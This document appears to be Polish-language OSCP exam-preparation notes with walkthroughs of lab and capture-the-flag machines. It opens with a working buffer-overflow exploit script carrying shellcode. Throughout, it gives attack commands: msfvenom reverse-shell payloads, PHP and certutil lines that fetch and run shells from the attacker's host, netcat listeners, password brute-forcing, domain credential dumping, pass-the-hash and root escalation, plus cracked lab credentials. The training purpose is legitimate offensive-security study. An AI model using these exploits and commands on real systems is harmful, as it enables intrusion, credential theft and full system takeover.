sock.connect(ip)

bad = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf" 
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buf =  b""
buf += b"\xda\xd2\xb8\x3d\x2b\xc7\x83\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x52\x31\x46\x17\x83\xc6\x04\x03\x7b"
buf += b"\x38\x25\x76\x7f\xd6\x2b\x79\x7f\x27\x4c\xf3\x9a"
buf += b"\x16\x4c\x67\xef\x09\x7c\xe3\xbd\xa5\xf7\xa1\x55"
buf += b"\x3d\x75\x6e\x5a\xf6\x30\x48\x55\x07\x68\xa8\xf4"
buf += b"\x8b\x73\xfd\xd6\xb2\xbb\xf0\x17\xf2\xa6\xf9\x45"
buf += b"\xab\xad\xac\x79\xd8\xf8\x6c\xf2\x92\xed\xf4\xe7"
buf += b"\x63\x0f\xd4\xb6\xf8\x56\xf6\x39\x2c\xe3\xbf\x21"
buf += b"\x31\xce\x76\xda\x81\xa4\x88\x0a\xd8\x45\x26\x73"
buf += b"\xd4\xb7\x36\xb4\xd3\x27\x4d\xcc\x27\xd5\x56\x0b"
buf += b"\x55\x01\xd2\x8f\xfd\xc2\x44\x6b\xff\x07\x12\xf8"
buf += b"\xf3\xec\x50\xa6\x17\xf2\xb5\xdd\x2c\x7f\x38\x31"
buf += b"\xa5\x3b\x1f\x95\xed\x98\x3e\x8c\x4b\x4e\x3e\xce"
buf += b"\x33\x2f\x9a\x85\xde\x24\x97\xc4\xb6\x89\x9a\xf6"
buf += b"\x46\x86\xad\x85\x74\x09\x06\x01\x35\xc2\x80\xd6"
buf += b"\x3a\xf9\x75\x48\xc5\x02\x86\x41\x02\x56\xd6\xf9"
buf += b"\xa3\xd7\xbd\xf9\x4c\x02\x11\xa9\xe2\xfd\xd2\x19"
buf += b"\x43\xae\xba\x73\x4c\x91\xdb\x7c\x86\xba\x76\x87"
buf += b"\x41\x05\x2e\x98\xa9\xed\x2d\xa6\xd8\xb1\xb8\x40"
buf += b"\xb0\x59\xed\xdb\x2d\xc3\xb4\x97\xcc\x0c\x63\xd2"
buf += b"\xcf\x87\x80\x23\x81\x6f\xec\x37\x76\x80\xbb\x65"
buf += b"\xd1\x9f\x11\x01\xbd\x32\xfe\xd1\xc8\x2e\xa9\x86"
buf += b"\x9d\x81\xa0\x42\x30\xbb\x1a\x70\xc9\x5d\x64\x30"
buf += b"\x16\x9e\x6b\xb9\xdb\x9a\x4f\xa9\x25\x22\xd4\x9d"
buf += b"\xf9\x75\x82\x4b\xbc\x2f\x64\x25\x16\x83\x2e\xa1"
buf += b"\xef\xef\xf0\xb7\xef\x25\x87\x57\x41\x90\xde\x68"
buf += b"\x6e\x74\xd7\x11\x92\xe4\x18\xc8\x16\x14\x53\x50"
buf += b"\x3e\xbd\x3a\x01\x02\xa0\xbc\xfc\x41\xdd\x3e\xf4"
buf += b"\x39\x1a\x5e\x7d\x3f\x66\xd8\x6e\x4d\xf7\x8d\x90"
buf += b"\xe2\xf8\x87"

nop = "\x90" * 16

# 77D34E5B
eip = "\x5b\x4e\xd3\x77"


#przy http musimy cos zdefiniowac bo inaczej serwer nie bedzie wiedzial co ma zrobic
evil  = "GET"
#evil += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A>
#evil += "A" * 1788 + "BBBB" + "C" * 500
evil += "A" * 1788 + eip + nop + buf + nop

#musimy poprawnie dla http skonstrulowac naglowej 
evil += "HTTP/1.1\r\n\r\n"


sock.send(evil)
sock.close()

***

🏠 Homework
### 📋 – Buffer Overflow Exam 3 
(Win7_x32_BoF_E3_Server.ova)

***

### 📋 – NEO (Final Practical Exam 1)
(neo.ova)

nmap IP_maszyny -Pn
nmap IP_maszyny -p-
nmap IP_maszyny -A

🔗 -- nmap automator:
https://github.com/21y4d/nmapAutomator

#notujemy na przyszłość:
    22/tcp open ssh
    80/tcp open http
    111/tcp open rpcbind

🔗 -- jako inspiracja - co można jeszcze sprawdzić:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh

nikto -h IP_maszyny

dirb http://IP_maszyny

🔗 -- szukamy podatności 
https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/version_id-490988/Apache-Http-Server-2.2.22.html
https://www.exploit-db.com/

#phpLiteAdmin 
http://IP_maszyny/dbadmin/

haslo: admin

/usr/databases/test_users:
    root   653F4B285089453FE00E2AAFAC573414   
    zico    96781A607F4E9F5F423AC01F0DAB0EBD

🔗 -- strona do łamania hash:
https://crackstation.net/
    root:34kroot34
    zico:zico2215@

***

📅 05.03.2023 🕘 [09:00]

OSCP Preparation Day 2
= - = - = - = - = - = 

#Na bazie strony: https://www.exploit-db.com/exploits/24044 (aby osadzić plik z reverse shellem, trzeba wykonać atak LFI):
    punkt 1. tworzymy nową bazę danych hack.php
    punkt 2. w tym miejscu właśnie będzie nasz payload z reverse shell'em
    create new table - name
    no of fields 1
    field - column1 
    type - text <<= !!superważne!!
    Default value <?php phpinfo()?>

#Reverse shell pobieramy z:
    cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
#modyfikujemy w tym pliku IP i port do nasłuchiwania:
    $ip=ip_kali
    $port=4444
#udostępniamy plik:
    python3 -m http.server 80
#uruchamiamy nasłuchiwanie:    
    nc -nlvp 4444
    
#tworzymy nową tabelę jak wyżej zmieniamy jedynie Default value na:
    <?php system("wget IP_kali/shell.php -O /tmp/shell.php; php /tmp/shell.php");?>
    
    
🔗 -- podpowiedzi od g0tmi1k:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

#po uzyskaniu sesji:
    cd home
    ls
    cd zico
    ls
    cat to_do.txt
    cd wordpress
    cat wp-config.php

#używamy ssh:
    ssh zico@IP_kali
    używamy hasła pozyskanego z pliku wp-config.php
    sudo -l

🔗 -- podpowiedzi jak wykonać eskalację uprawnień:
https://gtfobins.github.io/gtfobins/tar/#sudo

#pionowa eskalacja uprawnień:
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    whoami


Root Dance <dance>

***

### 📋 – Final Practical Exam 1
(iloverobot.ova)

nmap IP_maszyny
nmap IP_maszyny -A
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>

nikto -h IP_maszyny

http://IP_maszyny/robots.txt
http://IP_maszyny/info.php
http://IP_maszyny/phpmyadmin/

dirb http://IP_maszyny
gobuster dir -u http://IP_maszyny -w /usr/share/dirb/wordlist/common.txt -t 50

http://IP_maszyny/wp
http://IP_maszyny/wordpress/

elliot - może być userem

wpscan --url http://<ip_maszyny>/wordpress

🏠 Homework
przetestować logowanie (brute force) przy pomocy hydry i Burp. Porównać szybkość działania.

hydra -l elliot -P /usr/share/wordlists/rockyou.txt ssh://ip_maszyny -t 4

ssh elliot@ip_maszyny
sudo -l
(ALL:ALL) ALL - #to oznacza, że ten user może wykonać wszystkie operacje z uprawnieniami root
sudo su

Root Dance <dance>

***

### 📋 – Final Practical Exam 1
(whiterabbit.ova)

nmap IP_maszyny
nmap IP_maszyny -A
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>
nmap IP_maszyny -p-

mysql -h IP_Maszyny -u root -p ''  - nie działa

ftp IP_Maszyny  (z banera odczytujemy usera: Harry)
anonymous/anonymous
ls
get note (plik pobrał się do katalogu, w którym lokalnie byliśmy)

cat note (user Elly)

nikto -h IP_maszyny
http://IP_maszyny

#user to nazwa pliku, który zawiera 3 userów

hydra -L user -P /usr/share/wordlists/rockyou.txt ssh://ip_maszyny -t 4

nikto -h IP_maszyny -p 12380

http://IP_maszyny:12380

https://IP_maszyny:12380/blogblog/

#żeby wyłączyć sprawdzanie certyfikatu ssl dodajemy --disable-tls-checks:
wpscan -e --url https://IP_Maszyny:12380/blogblog/ --disable-tls-checks

wpscan --url https://IP_maszyny:12380/blogblog/ --disable-tls-checks --enumerate u --passwords /usr/share/john/password.lst

#logujemy się do wpadmin przy pomocy zdobytych poświadczeń

wpscan --url https://IP_maszyny:12380/blogblog/ --disable-tls-checks --enumerate u --passwords /usr/share/wordlists/rockyou.txt

    [+] Performing password attack on Xmlrpc Multicall against 11 user/s


    [SUCCESS] - garry / football

    [SUCCESS] - harry / monkey

    [SUCCESS] - scott / cookie

    [SUCCESS] - kathy / coolgirl

    [SUCCESS] - barry / washere

    [SUCCESS] - john / incorrect

    [SUCCESS] - tim / thumb


# Użytkownik o najwyższych uprawnieniach johh:incorrect

# Próbujemy zmienić zawartość pliku 
Appearance > Editor > 404 Template (404.php) lub Footer (footer.php)
Brak możliwości zapisu

# Upload pliku
Upload New Media > walidacja rozszerzenia

#Upload pliku przez Plugins

Plugind > Add New > Upload Plugin > Browse
Plik shell.php po uploadzie pojawia się zakładce Media


#Uzyskujemy revshell

python -c 'import pty; pty.spawn("/bin/bash")'

    www-data@whiterabbit:/$



#Weryfikujemy pliki konfiguracyjne Wordpress

www-data@whiterabbit:/$ cd /var/www/https/blogblog
cat wp-config.php

    /** MySQL database username */
    define('DB_USER', 'root');

    /** MySQL database password */
    define('DB_PASSWORD', 'plbkac');


#Wykorzystujemy linenum.sh do enumeracji systemu
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

chmod +x LinEnum.sh
./LinEnum.sh

### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 32
-rw-r--r--   1 root root    56 Jun  3  2016 logrotate

[-] Location and contents (if accessible) of .bash_history file(s):

sshpass -p thisimypassword ssh JKanode@localhost
sshpass -p JZQuyIN5 peter@localhost


#Logujemy się na usera peter

www-data@whiterabbit:/tmp$ su peter
Password: JZQuyIN5

#Eskalujemy się pionowo do root

whiterabbit% sudo bash
root@whiterabbit:/tmp# cat /root/root.txt

Root Dance <dance>

***

🔗 -- NetSecFocus Trophy Room
https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#

***

### 📋 – Extra Exam Machines - Joker
(Joker.ova)

nmap joker

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49158/tcp open  unknown

#FTP

ftp joker      
Connected to joker.
220 Microsoft FTP Service
Name (joker:kali): anonymous
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
07-15-20  12:32PM       <DIR>          aspnet_client
07-15-20  12:31PM                  689 iisstart.htm
07-15-20  12:31PM               184946 welcome.png

#Utworzenie revshella w formacie .aspx

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.56 LPORT=4444 -f aspx > revshell.aspx

#Upload pliku do katalogu głównego na ftp

put revshell.aspx

#Metasploit - oneliner

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"

Brak połączenia - próbujemy innej metody.

#Upload webshella .aspx
cp /usr/share/webshells/aspx/cmdasp.aspx .

#Wykorzystujemy połączenie ftp
put cmdasp.aspx

# tcpdump z Kali
sudo tcpdump -i eth0 -n icmp

# Inny Reverse Shell aspx
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx

#Zmiana IP i portu na Kali i Upload za pomocą ftp
put shell.aspx

#netcat
nc -lnvp 4444

#Otrzymujemy sesję

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

type c:\temp\Unattend.xml

<AutoLogon>
                <Password>
                    <Value>Z2V0bG9zdEAxMjM=</Value>
                    <PlainText>false</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <Username>Admin</Username>

#Base64 > CyberChef
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=WjJWMGJHOXpkRUF4TWpNPQ

Z2V0bG9zdEAxMjM=:getlost@123

#RDP

    Weryfikujemy użytkowników w systemie


dir c:\users
 Volume in drive C has no label.
 Volume Serial Number is 08B8-9270

 Directory of c:\users

07/15/2020  12:32 PM    <DIR>          Classic .NET AppPool
07/15/2020  12:34 PM    <DIR>          DefaultAppPool
07/15/2020  02:30 PM    <DIR>          Guest
07/15/2020  02:46 PM    <DIR>          John
11/21/2010  12:46 PM    <DIR>          Public
08/18/2020  05:26 PM    <DIR>          user

    Logujemy się na użytkownika user


rdesktop -u user -p getlost@123 IP_joker

lub narzędzie remmina

apt install remmina

c:\Users\user\local.txt.txt

Congratulation!
You have got the Basic Access..
Now try to get Admin.
{OffSec_Says_Try_Harder}


#PowerUP (PowerSpolit)

https://powersploit.readthedocs.io/en/latest/Privesc/
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

#Eskalacja pionowa - Import PowerUP

Import-Module .\PowerUp.ps1
Set-ExecutionPolicy unrestricted -Scope currentuser
Import-Module .\PowerUp.ps1

#Wykonanie wszystkich sprawdzeń przez PowerUP

Invoke-AllChecks

Write-UserAddMSI

#Uruchamiamy instalator UserAdd.msi

    Tworzymy uzytkownika backdoor:password123

    Łączymy się ponownie przez RDP

    c:\Users\John\flag.txt


    Congratulations!

    You own me now.

    {Enumeration_Is_The_Key}


***

### 📋 Windows PE 1 Exam – Inception
(Inception.ova)

nmap IP_inception    

PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
3389/tcp open  ms-wbt-server

💡 Na maszynie znajduje się webshell
http://inception/cmdasp.aspx

🔗 -- LOLBAS Living Off The Land Binaries, Scripts and Libraries
https://lolbas-project.github.io/

#Utworzenie revshella:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.97 LPORT=4444 -f exe > shell.exe

# Pobranie Reverse Shell
certutil.exe -urlcache -split -f http://192.168.31.56/shell.exe C:\Temp\shell.exe

python3 -m http.server 80

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"

C:\Temp\shell.exe

#Otrzymujemy sesję meterpretera

***

📅 11.03.2023 🕘 [09:00]

OSCP Preparation Day 3 
= - = - = - = - = - = 

### 📋 Windows PE 1 Exam – Inception - dokończenie
(Inception.ova)

meterpreter > shell
Process 4712 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19041.264]
(c) 2020 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
inception\anderson

net user

User accounts for \\INCEPTION
-------------------------------------------------------------------------------
Administrator            Anderson                 DefaultAccount           
Elliot                   Guest                    WDAGUtilityAccount       
The command completed successfully.


🔗 -- Winpeas
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

🔗 -- winPEASx86.exe
https://github.com/carlospolop/PEASS-ng/releases/download/20230305/winPEASx86.exe

Kali:

wget https://github.com/carlospolop/PEASS-ng/releases/download/20230305/winPEASx86.exe

python -m http.server 80

Windows (shell)

cd Temp

certutil.exe -urlcache -split -f http://192.168.31.56/winPEASx86.exe C:\Temp\win.exe

win.exe

Analiza outputu.

Installed Applications --Via Program Files/Uninstall registry--
Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software                                      
    C:\Program Files (x86)\iS3\STOPzilla AntiMalware


STOPzilla AntiMalware 6.5.2.59 - Privilege Escalation (1)
https://www.exploit-db.com/exploits/45401

searchsploit -m 45401
Copied to: ~/inception/45401.c

Kompilacja exploita:

sudo apt-get install gcc-mingw-w64-x86-64

x86_64-w64-mingw32-gcc 45401.c -o expl.exe

Nie działa - za dużo errorów, nie powstaje exploit.

Próbujemy kolejny exploit

🔗 -- STOPzilla AntiMalware 6.5.2.59 - Privilege Escalation (2)
https://www.exploit-db.com/exploits/45496

searchsploit -m 45496

Edycja kodu źródłowego:
    
    // The command or binary file to be executed can be changed here
    sprintf(netcommand, "shelladmin.exe");

x86_64-w64-mingw32-gcc 45496.c -o expl.exe

Towrzymy payload
msfconsole -p windows/shell_reverse_tcp LHOST=192.168.31.56 LPORT=443 -f exe > shelladmin.exe

nc -lnvp 443

.\expl.exe

-------------------------------------------------------------------------------
         STOPzilla AntiMalware (szkg64.sys) Arbitrary Write EoP Exploit        
                 Tested on 64bit Windows 7 / Windows 10 (1803)                 
-------------------------------------------------------------------------------
[+] New token created successfully
[i] Running Windows 10
[*] Creating new process...
[+] Executed command successfully


Po kilku uruchomieniach otrzymujemy reverse shell

Microsoft Windows [Version 10.0.19041.264]
(c) 2020 Microsoft Corporation. All rights reserved.

c:\Temp>whoami
whoami
nt authority\system

c:\Users\Elliot\Desktop>type flag.txt

***

### 📋 Semi Exam 1 - Rider
(Rider.ova)

    ftp > anonymous > <nopassword>


secret.txt

    Użytkownicy:

    root
    leet
    rider

    Podmontowanie zasobu:

    showmount -e 192.168.31.52 <Rider>

    /home/leet *


cd /tmp
mkdir punktmontowania

sudo mount -o rw,vers=3 192.168.31.52:/home/leet /tmp/punktmontowania

    Tworzenie kluczy ssh


mkdir .ssh
cd .ssh
touch authorized_keys
ssh-keygen
cat ~/.ssh/id_rsa.pub

    sh-rsa AAAAB3NzaC1y....


# Osadzamy klucz w pliku authorized_keys i zapisujemy
nano authorized_keys

    Logowanie przez ssh na użytkownika leet


ssh -i id_rsa leet@192.168.31.52

    Zawartość pliku wp-config.php


leet@provider:/var/www/html$ more wp-config.php

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'getlost@123' );


    Logowanie na użytkownika rider:

ssh rider@192.168.31.52

rider@provider:~$ sudo -l
[sudo] password for rider: 
Matching Defaults entries for rider on provider:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rider may run the following commands on provider:
    (ALL : ALL) ALL

sudo su

cat /root/flag.txt 

***

### 📋 Semi Exam 2 - Closed Door
(ClosedDoor.ova)

    blogengine.net > port 8080

    admin:admin


    Znane podatności dla blogengine:


🔗 -- BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
https://www.exploit-db.com/exploits/46353

    searchsploit -m 46353


    Edycja exploita i zapis w pliku PostView.ascx


    protected override void OnLoad(EventArgs e) {

            base.OnLoad(e);


            using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("<IP Kali>", 4444)) 


    Upload pliku do lokalizacji:

    

    http://<IP Closed Door>/admin/app/editor/editpost.cshtml


    Odwołujemy się do pliku: http://<IP Closed Door>:8080/?theme=../../App_Data/files


#oczekiwanie na sesję reverse shell
nc -nvlp 4444 

#jest sesja:
    dir
    whoami (john-pc\blogengine)

#sprawdzamy co to jest: exacqVisionesm i szukamy exploita na to:
    https://www.exploit-db.com/exploits/46370

#wchodzimy do tego folderu:
    cd exacqVisionesm
    
#tworzymy reverse shell:
    msfvenom -p windows/shell_reverse_tcp LHOST=IP_kali LPORT=443 -f exe > enterprisesystemmanager.exe
#zmienamy oryginalną nazwę pliku enterprisesystemmanager.exe na enterprisesystemmanager.bak
#udostępniamy go:
    python -m http.server 80
#pobieramy na maszyne do katalogu c:\exacqVisionEsm\EnterpriseSystemManager
    certutil.exe -urlcashe -split -f http://ip_kali:80/enterprisesystemmanager.bak

#zmieniamy nazwę enterprisesystemmanager.bak > enterprisesystemmanager.exe

#oczekiwanie na kolejną sesję reverse shell
nc -nvlp 443
 
#restartujemy usługę:
    sc query
    sc qc
    sc qc "exacqVision Enterprise System Manager Web Service"
    sc stop "exacqVision Enterprise System Manager Web Service"
    sc start "exacqVision Enterprise System Manager Web Service"
    #powinna przyjechać sesja z uprawnieniami NT Authority

***

### 📋 Attacktive Directory (na tryhackme.com)
(https://tryhackme.com/room/attacktivedirectory)

#Na kalim spinamy tunel do TryHackMe:
    sudo openvpn THM.ovpn
nmap IP_Maszyny
nmap IP_Maszyny -A

enum4linux IP_maszyny

nazwa maszyny: spookysec.local
#robimy przekierowanie na tą maszyne po nazwie:
    nano /etc/host
    IP_maszyny   spookysec.local
#sprawdzamy:
    ping spookysec.local
    
🔗 -- lista haseł i innych przydanych narzędzi
 https://github.com/danielmiessler/SecLists 
    
https://github.com/ropnop/kerbrute
https://github.com/ropnop/kerbrute/releases/tag/v1.0.3

#userlist.txt pobieramy z opisu Zadania 4 na TryHackme
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

🔗 -- !!! Można użyć tego narzędzia na egzaminie:
./kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local userlist.txt -t 10

🔗 -- AS-REP Roasting - wiecej info
https://thehackernews.com/2021/09/what-is-as-rep-roasting-attack-really.html
https://github.com/Sq00ky/attacktive-directory-tools/blob/master/passwordlist.txt

🔗 -- Lista userów (users):
james@spookysec.local
svc-admin@spookysec.local
James@spookysec.local
robin@spookysec.local
darkstar@spookysec.local
administrator@spookysec.local
backup@spookysec.local
paradox@spookysec.local
JAMES@spookysec.local
Robin@spookysec.local
Administrator@spookysec.local
Darkstar@spookysec.local
Paradox@spookysec.local
DARKSTAR@spookysec.local
ori@spookysec.local
ROBIN@spookysec.local

python3 GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -usersfile users -no-pass   

🔗 -- info o hashcat
https://hashcat.net/hashcat/

 hashcat -a 0 -m 18200 hasz passwordlist.txt --force
 
 #hasło: svc-admin:management2005

rdesktop spookysec.local
#logujemy sie do zasobów sieciowych:
smbmap -H spookysec.local -d spookysec.local -u svc-admin -p management2005

smbclient \\\\spookysec.local\\backup --user svc-admin
dir
get backup_credentials.txt

cat backup_credentials.txt
echo <hash> | base64 -d
cat backup_credentials.txt | base64 -d

smbmap -H spookysec.local -d spookysec.local -u backup -p backup2517860

locate secretsdump (skopiować do naszego folderu roboczego)

#wyciągnie userów domenówych:
python3 secretsdump.py -just-dc backup@spookysec.local

locate psexec

ipacket-psexec Administrator@spookysec.local -hashes <hash>

#po uzyskaniu sesji 
whoami
cat /root/flag.txt 

***

### 📋 Lian_Yu
(https://tryhackme.com/room/lianyu)

nmap IP_maszyny -Pn
(ftp,ssh,vhttp,rpcbind)

gobuster dir -u http://IP_maszyny -w /usr/share/wordlists/dirb/common.txt -t 50
gobuster dir -u http://IP_maszyny -w /usr/share/wordlists/dirb/big.txt -t 4
curl IP_maszyny

http://ip_maszyny/island
(tekst biały na białym) + sprawdzic komentarze.

gobuster dir -u http://IP_maszyny -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

gobuster dir -u http://IP_maszyny/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 4

http://ip_maszyny/island/2100
#komentarz w źródle strony

gobuster dir -u http://IP_maszyny/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 4 -x .ticket

/green_arrow.ticket

http://ip_maszyny/island/2100/green_arrow.ticket
#pojawił sie token

#rozkodowujemy przy użyciu:
https://gchq.github.io/CyberChef/ 

ftp IP_maszyny
#pobieramy 3 pliki graficzne
get nazwa_pliku

#czytamy nazwę pliku:
    cat nazwa_pliku
    exiftool nazwa_pliku


🔗 -- info o plikach png
http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html 

#sprawdzamy nagłówek plików i porownujemy je:
    hexeditor nazwa_pliku
#podmieniamy początek nagłówka w pliku leave_me_alone.png na nagłówek z innego pliku i po naprawie nagłówka obraz się wyświetla (zapisujemy jako aa.jpg)

#steghide - do odnajdowania ukrutych informacji w pliku:
    steghide info aa.jpg
    steghide extract -sf aa.jpg
#dalsze operacje na uzyskanych plikach
    unzip ss.zip
    cat passwd.txt
    cat shado #wygląda jak haslo M3tahuman
    ssh oliver@ip_maszyny
#wracamy do ftp, hasło te rozkodowane z cyberchef:
    ftp ip_maszyny 
    ls -al
#pobieramy również ukryte pliki
#idziemy poziom wyżej:
    cd ..  (widzimy 2 foldery, które mogą być nazwami userów)
ssh slade@ip_maszyny

#eskalacja uprawnień do root:
    id (sudo -l)
#szukamy podpowiedzi:
    https://gtfobins.github.io/gtfobins/pkexec/         
    sudo /usr/bin/pkexec /bin/bash
    whoami
    
    <root dance>
 
#flagi:
    cd /root
    cat root.txt
    cd /home/linayu/
    cat user.txt
   
    
***

### 📋 bsidesgtlibrary
(https://tryhackme.com/room/bsidesgtlibrary)

nmap ip_maszyny  (otwrte porty 22, 80)
http://ip_maszyny
(user: meliodas) 

gobuster dir -u http://ip_maszyny -w /usr/share/wordlists/dirb/common.txt
nikto -h ip_maszyny 

http://ip_maszyny/robots.txt

hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://ip_maszyny -t 4
(iloveyou1)

ssh meliodas@ip_maszyny

id
sudo -l

🏠 Homework
do sprawdzenia jak to można wykorzystać i wykonać eskalację uprawnień do root.

📅 12.03.2023 🕘 [09:00]

sudo python /home/meliodas/bak.py
nano /home/meliodas/bak.py
cd /home/meliodas/
mv bak.py bak.py.old
touch bak.py
nano bak.py

#sprawdzamy podpowiedź:
    https://gtfobins.github.io/gtfobins/python/
#dodajemy do pliku bak.py:
    sudo python -c 'import os; os.system("/bin/sh")'
#poprawiamy:
    import os; os.system("/bin/sh")
    
sudo python /home/meliodas/bak.py
id #jest root

<root dance>

#flagi:
    cd /root
    cat root.txt
    cd /home/meliodas/
    cat user.txt


***

### 📋Thompson
(https://tryhackme.com/room/bsidesgtthompson)

nmap IP_maszyny (otwarte porty 22, 8009, 8080)
http://IP_maszyny:8080

nikto -h ip_maszyny 

#tutaj znajdujemy hasło do tomcat:
    http://IP_maszyny:8080/manager/status
    username: tomcat, password: s3cret

#szukamy  podpowiedzi:
    https://vk9-sec.com/apache-tomcat-manager-war-reverse-shell/
    https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
    sekcja MSFVenom Reverse Shell

#tworzymy payload:
    msfvenom -p java/jsp_shell_reverse_tcp lhost=IP_kali lport=443 -f war -o rev.war
    
#nasłuchowanie:
    nc -lnvp 443

#na stronie http://IP_maszyny:8080 po zalogowaniu robiy deploy utworzonego paylod a później urchamiamy go, klikając na niego
    
#po uzyskaniu sesji:
    id
    
#zmieniamy sesje :
    python -c 'import pty; pty.spawn("/bin/bash")'
    id

#eskalacja uprawnień:
#pobieramy linpeas https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS :
    https://github.com/carlospolop/PEASS-ng/releases/tag/20230312
    linpeas_linux_amd64
#udostępniamy go:
    python -m http.server 80
#uruchamiamy na maszynynie:
    ./linpeas_linux_amd64

#crontab: https://crontab.guru

echo "cp /etc/passwd /home/jack/passwd" >> id.sh
cat id.sh

echo "cp /etc/shadow /home/jack/shadow" >> id.sh
cat id.sh

#wykonujemy poniższe polecenia aby zresetowac hasło root:
    echo "echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd" >> id.sh
    echo "touch /home/jack/zrobilem" >> id.sh

cat /etc/passwd

🏠 Homework
dokończenie zadania 

#flagi:
cat /home/jack/flag.txt
cat /root/flag.txt

***

### 📋 Agentsudoctf
(https://tryhackme.com/room/agentsudoctf)

nmap IP_maszyny (otwarte porty 21, 22, 80)
nmap IP_maszyny -A

ftp IP_maszyny
anonymous #nie działa

nikto -h IP_maszyny

http://IP_maszyny

#uruchomić narzędzie burp
#w repeater
User_Agent: codename
User_Agent: R
User_Agent: C
(User: Chris)

